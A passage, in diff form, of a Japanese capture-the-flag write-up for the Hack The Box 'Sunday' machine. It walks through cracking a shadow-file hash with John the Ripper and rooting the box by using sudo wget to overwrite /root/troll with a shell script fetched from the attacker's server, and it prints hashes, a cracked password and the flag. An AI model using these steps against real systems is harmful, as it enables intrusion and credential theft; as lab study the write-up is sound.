@@ -366,4 +366,138 @@ This is perl 5, version 34, subversion 0 (v5.34.0) built for x86_64-linux-gnu-th
 
   https://www.youtube.com/watch?v=DIvULLqbKCk
 
-* 
+  ![image-20220722215256446](img/image-20220722215256446.png)
+
+  sunnyのパスワードはsunday
+
+  * SSHしてみる
+
+  ![image-20220722215620893](img/image-20220722215620893.png)
+
+  →witeupとは異なりできてしまった。
+
+## Privilege Escalation
+
+* 以下コマンドを実行
+
+```bash
+sunny@sunday:/home/sammy$ sudo -l
+ユーザー sunny は sunday 上で コマンドを実行できます
+    (root) NOPASSWD: /root/troll
+```
+
+```bash
+sunny@sunday:/home/sammy$ sudo /root/troll
+testing
+uid=0(root) gid=0(root)
+```
+
+→何らかのシェルが実行されrootのidが表示されている
+
+* /backupディレクトリに複数のバックアップあり。
+
+```bash
+sunny@sunday:/backup$ ls
+agent22.backup  shadow.backup
+sunny@sunday:/backup$ cat shadow.backup 
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+```
+
+→shadowファイルである。
+
+* Sammyのパスワードをハッシュファイルとして保存し、johnコマンドを利用してパスワードを取得する。
+
+```bash
+john sammy-hash.txt --show
+```
+
+* テキストファイルにはshadowの出力をそのままのフォーマットで張った方が結果が見やすい
+* --showで途中経過が見える。長い時に途中でqできるように。
+
+[John the Ripper password cracker](https://www.openwall.com/john/)
+
+```
+ sammy-hash.txt ist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8        
+Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])                         
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+cooldude!        (?)     
+1g 0:00:01:21 DONE (2022-07-22 22:22) 0.01222g/s 2491p/s 2491c/s 2491C/s daddyzgurl..chrystelle
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+* sammyにスイッチする。
+
+```bash
+su - sammy
+```
+
+* sudo権限のあるコマンドを確認する
+
+```bash
+sudo -l
+
+-bash-4.4$ sudo -l
+ユーザー sammy は sunday 上で コマンドを実行できます
+    (ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+
+```
+
+```
+sudo wget -i /root/root.txt
+```
+
+→Writeupとは異なり、うまくDNSができず、URLを生成できなかった。
+
+* root権限奪取をする。以下流れで行う
+  * sammyがwgetのsudo権限を持っているので/root/trollのスクリプトの中身を書き換える
+  * sunnyが/root/trollの実行権限を持っているので書き換えたスクリプトを実行する
+
+まずkaliのディレクトリでtrollを作り、サーバーを立ち上げる
+
+```bash
+touch troll
+vi troll
+
+# ファイルの中身
+!#/bin/usr/bash
+bash
+
+python -m http.server 5555
+```
+
+Sundayのサーバーで以下コマンドを実行する。
+
+```bash
+sudo wget -O /root/troll http://10.10.16.3:5555/troll; sudo /root/troll
+```
+
+※確かめたところsammyでも/root/trollを実行できた。
+※定期的にtrollが上書きされているようで何度か失敗したが、コマンドを連続実行することでroot奪取に成功した。
+
+```bash
+root@sunday:/home/sammy# cat /root/root.txt
+fb40fab61d99d37536daeec0d97af9b8 
+```
+
+## 所感
+
+* 10.10.10.76にSSHしてからのサーバーの動作が遅すぎてイライラした。
+* fingerサービスが稼働していたらusernameを探ってみる。
+  * brute-forceして、見つかったユーザでfingerの流れ
+* nmapは、ポートをある程度確認してからポートを絞って詳細情報を確認すると早い
+* escalationのとき、sudo -lでユーザのsudo権限を確認できる
+* wgetをうまく使うことでroot奪取できるテクニックはぜひ覚えたい
